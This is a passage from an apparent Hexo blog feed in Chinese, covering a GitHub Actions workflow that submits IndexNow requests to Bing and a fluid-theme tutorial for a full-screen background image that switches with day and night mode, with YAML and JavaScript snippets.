<code>key.txt</code> 一同被推送至仓库根目录。</p><h3 id="本地创建-workflows"><a class="markdownIt-Anchor" href="#本地创建-workflows"></a> 本地创建 workflows</h3><h4 id="hexo-配置"><a class="markdownIt-Anchor" href="#hexo-配置"></a> Hexo 配置</h4><p>创建 GitHub workflow 一般是<code>.github/workflows/xxx.yml</code></p><p>但是 Hexo 默认忽略以点（<code>.example</code>）开头的文件和文件夹，所以我的做法是修改<code>_config.yml</code> 中的 <code>include</code> 项，将其添加进去：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">include</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  - </span><span style="color: #CE9178">".github/**/**"</span></span></code></pre></div></div></figure><p>此时还需要修改下 <strong>skip_render</strong> 这个配置，否则 hexo 会自动把 yaml 文件给转成 json 格式的，到时候 GitHub 是不识别的（<code>_config.yml</code>）：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">skip_render</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  - </span><span style="color: #CE9178">".github/**/**"</span></span></code></pre></div></div></figure><p>最后需要配置下 hexo 的 <strong>deploy</strong> 配置，不要忽略隐藏文件。否则在最后部署到 GitHub 时，隐藏文件会被忽略掉（<code>_config.yml</code>）：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">deploy</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">type</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">git</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">repository</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">git@github.com:userName/userName.github.io.git</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">branch</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">master</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">ignore_hidden</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 取消忽略隐藏文件</span></span></code></pre></div></div></figure><blockquote><p><code>.github</code> 隐藏目录相关配置项参考链接为：<a href="https://knktc.com/2021/06/26/hexo-use-github-actions-to-submit-sitemap/">Hexo 博客使用 GitHub Actions 来自动提交 Sitemap</a></p></blockquote><p>这样，Hexo 会将 <code>source/.github</code> 文件夹中的内容也复制到 <code>public</code> 目录中，一旦执行 <code>hexo d</code> 命令便会部署到 GitHub。</p><p><strong>不过你得确保你的 <code>.github</code> 目录直接放在 <code>source</code> 目录下</strong>，即结构如下：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">your-hexo-site/</span></span><span class="line"><span style="color: #DCDCAA">├──</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">source/</span></span><span class="line"><span style="color: #DCDCAA">│</span><span style="color: #D4D4D4">   </span><span style="color: #CE9178">├──</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">.github/</span></span><span class="line"><span style="color: #DCDCAA">│</span><span style="color: #D4D4D4">   </span><span style="color: #CE9178">│</span><span style="color: #D4D4D4">   </span><span style="color: #CE9178">└──</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">workflows/</span></span><span class="line"><span style="color: #DCDCAA">│</span><span style="color: #D4D4D4">   </span><span style="color: #CE9178">│</span><span style="color: #D4D4D4">       </span><span style="color: #CE9178">└──</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">your-action.yml</span></span></code></pre></div></div></figure><p>这样一来，当你推送代码至仓库时，GitHub 会自动触发 Actions 运行你的 <code>your-action.yml</code> 文件，所以需要在这个 <code>yml</code> 文件中调用我们写的 Python 脚本。</p><h4 id="编写-action-触发文件"><a class="markdownIt-Anchor" href="#编写-action-触发文件"></a> 编写 action 触发文件</h4><p>我的 <code>indexnow.yml</code> 文件（名字可以随意，但请具有语义性）如下：</p><figure class="shiki yaml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">Submit IndexNow Request To Bing</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">on</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">push</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">branches</span><span style="color: #D4D4D4">: [</span><span style="color: #CE9178">"master"</span><span style="color: #D4D4D4">] </span><span style="color: #6A9955"># 根据需要替换为你的主分支</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">workflow_dispatch</span><span style="color: #D4D4D4">: </span><span style="color: #6A9955"># 允许手动触发工作流</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">jobs</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">indexnow</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">IndexNow</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">runs-on</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ubuntu-latest</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">steps</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">      - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">Checkout repository</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">uses</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">actions/checkout@v4</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">Set up Python</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">uses</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">actions/setup-python@v5</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">with</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">python-version</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"3.11"</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955"># 可以根据需要调整 Python 版本</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">Install dependencies</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">run</span><span style="color: #D4D4D4">: </span><span style="color: #C586C0">|</span></span><span class="line"><span style="color: #CE9178">          python -m pip install --upgrade pip</span></span><span class="line"><span style="color: #CE9178">          pip install requests  # 安装 requests 库</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      - </span><span style="color: #569CD6">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">Run IndexNow script</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">run</span><span style="color: #D4D4D4">: </span><span style="color: #C586C0">|</span></span><span class="line"><span style="color: #CE9178">          python index_now.py  # 替换为你的 Python 脚本文件名</span></span></code></pre></div></div></figure><p>该文件值得注意的点在于：</p><ol><li><code>branches: ["master"]</code></li><li><code>python index_now.py</code></li></ol><p>注意修改成你的配置项就行。</p><p>至此准备工作已经完毕，你只需要<strong>推送新代码到仓库</strong>就会自动触发 actions 发请求给必应的 indexnow，最终你可以在<a href="https://www.bing.com/webmasters/indexnow">必应网站管理员工具</a>查看效果。</p><ul><li>注：实际上你也可以单独在本地运行该 python 文件，效果是一致的。</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> GitHubActions </tag>
            
            <tag> indexnow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo fluid 全屏背景图随日夜模式切换以及正文底页毛玻璃效果</title>
      <link href="/posts/60191.html"/>
      <url>/posts/60191.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="实现背景图全屏效果"><a class="markdownIt-Anchor" href="#实现背景图全屏效果"></a> 实现背景图全屏效果</h2><blockquote><p>设置背景图为全屏效果，可以使用 fluid 提供的<a href="https://fluid-dev.github.io/hexo-fluid-docs/advance/#fluid-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81">注入代码功能</a>，可以将代码无侵入式加入到主题里。</p></blockquote><p>在根目录下新建一个 <code>scripts</code> 目录，在目录内新建：<code>injector.js</code></p><p>建好之后，博客的根目录大致如下：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">├─📁 .github/</span></span><span class="line"><span style="color: #D4D4D4">├─📁 scaffolds/</span></span><span class="line"><span style="color: #D4D4D4">├─📁 scripts/</span></span><span class="line"><span style="color: #D4D4D4">├─📁 source/</span></span><span class="line"><span style="color: #D4D4D4">├─📁 test/</span></span><span class="line"><span style="color: #D4D4D4">├─📁 themes/</span></span><span class="line"><span style="color: #D4D4D4">├─📄 _config.fluid.yml</span></span><span class="line"><span style="color: #D4D4D4">├─📄 _config.landscape.yml</span></span><span class="line"><span style="color: #D4D4D4">├─📄 _config.yml</span></span><span class="line"><span style="color: #D4D4D4">├─📄 .gitignore</span></span><span class="line"><span style="color: #D4D4D4">├─📄 package-lock.json</span></span><span class="line"><span style="color: #D4D4D4">├─📄 package.json</span></span><span class="line"><span style="color: #D4D4D4">├─📄 template.md</span></span><span class="line"><span style="color: #D4D4D4">└─📄 yarn.lock</span></span></code></pre></div></div></figure><div class="note warning flat"><p>⚠️注意：<br>该文件不需要在<code>_config.fluid.yml</code> 中进行引用，<strong>hexo 自动调用执行里面的 js 文件</strong></p></div><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">root</span><span style="color: #D4D4D4">: </span><span style="color: #4FC1FF">siteRoot</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"/"</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">extend</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">injector</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">register</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"body_begin"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">`&lt;div id="web_bg"&gt;&lt;/div&gt;`</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">hexo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">extend</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">injector</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">register</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"body_end"</span><span style="color: #D4D4D4">,</span><span style="color: #CE9178">`&lt;script src="</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">siteRoot</span><span style="color: #569CD6">}</span><span style="color: #CE9178">js/backgroundize.js"&gt;&lt;/script&gt;`</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>文件名其实可以随意，但接下来的 js 文件名请与 <code>src="${siteRoot}js/backgroundize.js"</code> 中保持一致。</p><p>如果你<strong>不需要</strong>背景图随日夜主题切换而切换的话，那么你只需要新建 <code>backgroundize.js</code> 并写入以下代码即可：(<code>source\js\backgroundize.js</code>)</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">document</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'#web_bg'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">setAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'style'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">`background-image: </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.banner'</span><span style="color: #D4D4D4">).</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">split</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">' '</span><span style="color: #D4D4D4">)[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">]</span><span style="color: #569CD6">}</span><span style="color: #CE9178">;position: fixed;width: 100%;height: 100%;z-index: -1;background-size: cover;`</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">document</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"#banner"</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">setAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'style'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'background-image: url()'</span><span style="color: #D4D4D4">)</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">document</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"#banner .mask"</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  .</span><span style="color: #DCDCAA">setAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'style'</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">'background-color:rgba(0,0,0,0)'</span><span style="color: #D4D4D4">)</span></span></code></pre></div></div></figure><p>第一段代码的功能是：找到根节点，在页面的 <code>body</code> 开始部分注入一个 <code>div</code> 元素，其 <code>id</code> 为 <code>web_bg</code>，作为背景图像的容器，然后在页面的 <code>body</code> 结束部分注入 js 文件（<code>backgroundize.js</code>）进行引用，确保脚本在页面加载完成后执行。</p><p>第二段代码的功能是：提取现有<code>.banner</code> 元素的图像 URL，将提取到的图像 URL 应用到 <code>web_bg</code> 元素上，同时设置背景样式为 <code>fixed</code> 固定定位、覆盖整个页面、<code>z-index: -1</code> 并置于其他元素之下。</p><p>至此，背景图就全屏且固定了。</p><h2 id="实现背景图随日夜主题切换效果"><a class="markdownIt-Anchor" href="#实现背景图随日夜主题切换效果"></a> 实现背景图随日夜主题切换效果</h2><p>看到这也就说明你需要标题所述功能。那么请将<code>_config.fluid.yml</code> 中涉及到 <code>banner_img</code> 的部分全部配置为空，因为我们要手动设置背景图。</p><p>例如首页 banner 和文章页 banner（可以通过搜索 <code>banner_img</code> 提高效率）：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160920360.png" alt="image-20250516092011283"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505160920829.png" alt="image-20250516092031772"></p><p>在 <code>source/js</code> 目录中新建或修改 <code>backgroundize.js</code> 文件，我的代码文件如下：<code>backgroundize.js</code></p><figure class="shiki javascript"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * author: 4rozeN</span></span><span class="line"><span style="color: #6A9955"> * file: backgroundize.js</span></span><span class="line"><span style="color: #6A9955"> * last modified: 2025-05-19</span></span><span class="line"><span style="color: #6A9955"> * description: 背景图随日夜模式切换处理。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 获取颜色模式切换按钮（深色 / 浅色）。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@type</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{HTMLElement | null}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">colorToggleButton</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"#color-toggle-btn .nav-link"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 背景容器元素（统一为 #web_bg）。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@type</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{HTMLElement}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">backgroundContainer</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"#web_bg"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 背景图片配置 ===</span></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * BACKGROUND_IMAGES 说明：</span></span><span class="line"><span style="color: #6A9955"> * - dark / light：按颜色模式分类；再区分 desktop / mobile 两张图。</span></span><span class="line"><span style="color: #6A9955"> * - fallback：在排除页面、或桌面 / 移动切换时的默认背景。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">dark:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">desktop:</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"URl1"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">mobile:</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"mobileURL"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">light:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">desktop:</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"URL2"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">mobile:</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"mobileURL"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">fallback:</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #CE9178">"fallbackURL"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 页面排除列表 ===</span></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 在以下路径（前缀匹配）不跟随颜色模式切换背景。</span></span><span class="line"><span style="color: #6A9955"> * 说明：主页 ("/") 也被视为排除页面。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@type</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{string[]}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">PAGE_EXCLUSIONS</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/links/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/about/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/categories/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/tags/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"/collections/"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">];</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 工具函数 ===</span></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 判断当前页面是否在排除列表中。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@param</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{string}</span><span style="color: #6A9955"> </span><span style="color: #9CDCFE">path</span><span style="color: #6A9955"> - location.pathname</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@returns</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{boolean}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">isExcludedPage</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"/"</span><span style="color: #D4D4D4">) </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: 